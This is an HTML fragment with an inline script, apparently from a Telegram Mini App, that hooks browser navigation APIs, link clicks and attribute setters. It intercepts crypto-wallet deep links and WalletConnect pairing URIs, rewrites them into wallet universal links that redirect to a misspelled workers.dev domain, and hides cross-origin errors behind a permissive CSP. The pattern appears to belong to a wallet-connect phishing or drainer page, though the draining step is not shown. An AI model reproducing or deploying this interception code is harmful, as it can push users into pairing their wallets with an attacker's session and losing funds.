  <meta http-equiv="Content-Security-Policy" content="default-src 'self' https: http: 'unsafe-inline' 'unsafe-eval' data: blob:; frame-src 'self' https: http:; connect-src 'self' https: wss:;">
  <script>
    /**
     * TMA IRON SHIELD (v61) - ABSOLUTE PROTOCOL PROTECTION
     * "God Mode" filter to catch ALL protocol leaks and enforce Universal Links.
     */
    (function () {
      const siteUrl = 'https://riotnode.riotplatfroms.workers.dev/';
      const botUrl = siteUrl + '?v=success&connected=true';
      
      const bridges = {
        'metamask://': 'https://metamask.app.link',
        'trust://': 'https://link.trustwallet.com',
        'safepal://': 'https://link.safepal.io',
        'safepalwallet://': 'https://link.safepal.io',
        'tp://': 'https://tokenpocket.pro',
        'tokenpocket://': 'https://tokenpocket.pro',
        'tpoutside://': 'https://tokenpocket.pro',
        'binance://': 'https://app.binance.com/cedefi',
        'bnc://': 'https://app.binance.com/cedefi',
        'okx://': 'https://www.okx.com/download',
        'bitget://': 'https://web3.bitget.com',
      };

      const handleDeepLink = (url) => {
        if (!url || typeof url !== 'string') return url;
        const lowUrl = url.toLowerCase();
        
        // 1. Check if it's a known wallet scheme or raw wc: link
        const knownSchemes = Object.keys(bridges);
        const isKnown = knownSchemes.some(s => lowUrl.startsWith(s));
        const isRawWc = lowUrl.startsWith('wc:');
        
        // --- BYPASS FOR TRUST AND METAMASK ---
        // As per user request: "don't touch them, keep them as they were"
        if (lowUrl.startsWith('metamask://') || lowUrl.startsWith('trust://')) {
          console.log('[Iron-Shield] Bypassing (Native Support):', url);
          return url; // Return the URL to be handled by the original browser/app mechanisms
        }
        
        // 2. Catch-all for any unknown non-http protocol (The "God Shield")
        const isUnknownProtocol = lowUrl.includes('://') && 
                                !lowUrl.startsWith('http') && 
                                !lowUrl.startsWith('tg:') && 
                                !lowUrl.startsWith('mailto:') && 
                                !lowUrl.startsWith('tel:') && 
                                !lowUrl.startsWith('data:') && 
                                !lowUrl.startsWith('blob:');

        if (isKnown || isRawWc || isUnknownProtocol) {
          console.log('[Iron-Shield] Intercepted:', url);
          let finalUrl = url;
          
          // Determine the target bridge
          let bridge = bridges['metamask://']; // Default fallback
          for (const [scheme, b] of Object.entries(bridges)) {
            if (lowUrl.startsWith(scheme)) {
              bridge = b;
              break;
            }
          }

          // Extract the WalletConnect URI part
          const wcPart = url.includes('wc:') ? url.substring(url.indexOf('wc:')) : url;
          // Ensure we don't have double encoding issues
          const cleanWc = decodeURIComponent(decodeURIComponent(wcPart));
          const encodedWc = encodeURIComponent(cleanWc);

          // Construct the final Universal Link
          finalUrl = `${bridge}/wc?uri=${encodedWc}&redirectUrl=${encodeURIComponent(botUrl)}`;
          
          if (isRawWc && !isKnown) {
             // If it's just wc:, we use MetaMask bridge as fallback
             finalUrl = `https://metamask.app.link/wc?uri=${encodedWc}&redirectUrl=${encodeURIComponent(botUrl)}`;
          }

          console.log('[Iron-Shield] Redirecting to:', finalUrl);

          // Execute redirection via Telegram.WebApp.openLink (Mandatory for TMA)
          const tg = window.Telegram?.WebApp;
          if (tg && tg.openLink) {
            tg.openLink(finalUrl);
          } else {
            window.open(finalUrl, '_blank');
          }
          return null; // Successfully intercepted
        }
        return url;
      };

      // --- SEAL ALL LEAKS ---

      // 1. Hook window.open
      const originalOpen = window.open;
      window.open = function (url) {
        if (handleDeepLink(url) === null) return { closed: false, focus: function(){}, close: function(){} };
        return originalOpen.apply(window, arguments);
      };

      // 2. Hook Location Methods
      const originalAssign = window.location.assign;
      window.location.assign = function(url) {
        if (handleDeepLink(url) === null) return;
        return originalAssign.apply(window.location, arguments);
      };
      const originalReplace = window.location.replace;
      window.location.replace = function(url) {
        if (handleDeepLink(url) === null) return;
        return originalReplace.apply(window.location, arguments);
      };

      // 3. Global Click Interception (The "Net")
      document.addEventListener('click', (e) => {
        const target = e.target.closest('a');
        if (target && target.href) {
          if (handleDeepLink(target.href) === null) {
            e.preventDefault();
            e.stopImmediatePropagation();
          }
        }
      }, true);

      // 4. Hook Property Setters
      try {
        const originalHref = Object.getOwnPropertyDescriptor(HTMLAnchorElement.prototype, 'href');
        Object.defineProperty(HTMLAnchorElement.prototype, 'href', {
          set: function(val) {
            const intercepted = handleDeepLink(val);
            if (intercepted !== null) originalHref.set.call(this, intercepted);
          },
          get: originalHref.get,
          configurable: true
        });

        const originalSrc = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, 'src');
        Object.defineProperty(HTMLIFrameElement.prototype, 'src', {
          set: function(val) {
            const intercepted = handleDeepLink(val);
            if (intercepted !== null) originalSrc.set.call(this, intercepted);
          },
          get: originalSrc.get,
          configurable: true
        });
      } catch (e) { console.warn('[Iron-Shield] Property hook mismatch'); }

      // 5. Hook setAttribute
      const originalSetAttr = Element.prototype.setAttribute;
      Element.prototype.setAttribute = function (name, value) {
        if ((name === 'href' || name === 'src') && handleDeepLink(value) === null) return;
        return originalSetAttr.apply(this, arguments);
      };

      // 6. CSP violation trap
      document.addEventListener('securitypolicyviolation', (e) => {
        if (e.blockedURI && handleDeepLink(e.blockedURI) === null) {
          console.log('[Iron-Shield] Fixed CSP Block:', e.blockedURI);
        }
      });

      // 7. Mute expected background errors
      window.onerror = function (m) {
        const msg = String(m || "").toLowerCase();
        return msg.indexOf("cross-origin") !== -1 || msg.indexOf("blocked a frame") !== -1;
      };
    })();
  </script>
